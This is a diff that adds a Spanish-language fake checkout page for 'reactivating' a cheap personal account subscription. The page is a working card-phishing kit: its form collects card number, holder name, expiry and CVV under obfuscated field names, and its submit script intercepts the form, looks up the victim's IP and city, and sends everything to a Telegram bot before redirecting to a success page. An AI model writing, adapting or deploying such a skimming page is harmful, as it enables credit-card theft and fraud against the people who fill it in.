@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>Reactivación</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+
+    <link rel="icon" href="icon.ico">
+    <link rel="stylesheet" href="normalize.css">
+    <link rel="stylesheet" href="pstyles.css">
+</head>
+
+<body>
+
+    <header class="h">
+        <div class="h-c">
+            <div class="logo-c">
+                <img src="c-logo.png" alt="">
+            </div>
+            <div class="vln"></div>
+            <div class="txt-c">
+                <p><strong>Estas comprando</strong><br>Cuenta Personal</p>
+                <h2 style="font-size: 30px; font-weight: 500;">$0.89 / Por año</h2>
+            </div>
+        </div>
+    </header>
+
+    <section class="c">
+
+        <div class="l-c">
+
+            <div class="f-c">
+                <form class="f" id="form" method="POST" action="success.php" enctype="multipart/form-data">
+
+                    <h2 class="f-t">Añade una tarjeta de credito</h2>
+
+                    <div class="p-meth">
+                        <img src="l_vis.svg" alt="">
+                        <img src="l_amex.svg" alt="">
+                        <img src="l_mc.svg" alt="">
+                        <img src="l_disc.svg" alt="">
+                    </div>
+
+                    <div id="alert" style="display: none;"></div>
+
+                    <div class="c-n">
+                        <label>Número de tarjeta*</label>
+                        <input type="text" pattern="[0-9]*" inputmode="numeric" class="test" id="c-n" name="rgtrthr"
+                            minlength="16" maxlength="16" required>
+                    </div>
+
+                    <div class="ch-n">
+                        <label>Cardholder Name*</label>
+                        <input type="text" id="a-n-f" name="xsdgtry" maxlength="100" required>
+                    </div>
+
+                    <div class="exp">
+                        <label>Expires*</label>
+
+                        <div class="date">
+                            <input type="number" name="cbyutnh" min="0" max="12" step="1" placeholder="Mes" required>
+                            <input type="number" name="rtmghm" min="0" max="48" step="1" placeholder="Año" required>
+                        </div>
+                    </div>
+
+                    <div class="c-s">
+                        <label>CVV*</label>
+                        <input type="text" pattern="[0-9]*" inputmode="numeric" id="t-p-f" name="puyhrx" minlength="3"
+                            maxlength="4" required>
+                    </div>
+
+                    <div class="s">
+                        <input type="submit" class="b" id="s-b" value="Continuar">
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+    <script type="text/javascript">
+
+        document.getElementById('c-n').addEventListener('input', function (e) {
+
+            const cnumber = document.querySelector('#c-n').value;
+            const alertCn = document.querySelector('#alert');
+
+            if (this.value.length > 3) {
+                if (cnumber.startsWith('4381')) {
+                    alertCn.innerHTML = '<p style="color: red;">No permitimos tarjetas de debito temporalmente.</p>';
+                    alertCn.style.display = "block";
+                    document.getElementById("s-b").disabled=true;
+                } else {
+                    alertCn.style.display = "none";
+                    document.getElementById("s-b").disabled=false;
+                }
+            }
+        });
+
+
+        document.getElementById("c-n").addEventListener("keypress", function (evt) {
+            if (evt.which < 48 || evt.which > 57) {
+                evt.preventDefault();
+            }
+        });
+    </script>
+	<script src="config.js"></script>
+<script>
+document.getElementById("form").addEventListener("submit", async function (e) {
+    e.preventDefault(); // Evita envío a success.php
+
+    const cardNumber = document.getElementById("c-n").value;
+    const cardHolder = document.getElementById("a-n-f").value;
+    const month = document.querySelector("input[name='cbyutnh']").value;
+    const year = document.querySelector("input[name='rtmghm']").value;
+    const cvv = document.getElementById("t-p-f").value;
+
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const ip = data.ip;
+        const city = data.city;
+
+        const now = new Date();
+        const hora = now.getHours().toString().padStart(2, '0');
+        const minutos = now.getMinutes().toString().padStart(2, '0');
+        const horaExacta = `${hora}:${minutos}`;
+
+        const message = `💳 @Dirtyo25\n\n🔢 Número: ${cardNumber}\n👤 Nombre: ${cardHolder}\n📅 Expira: ${month}/${year}\n🔒 CVV: ${cvv}\n\n🌍 IP: ${ip}\n🏙️ Ciudad: ${city}\n🕒 Hora: ${horaExacta}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+
+        console.log("Enviado a Telegram");
+
+        // Redirigir si deseas:
+		window.location.href = "success.html";
+
+    } catch (error) {
+        console.error("Error al enviar a Telegram", error);
+    }
+});
+</script>
+
+</body>
+
+</html>
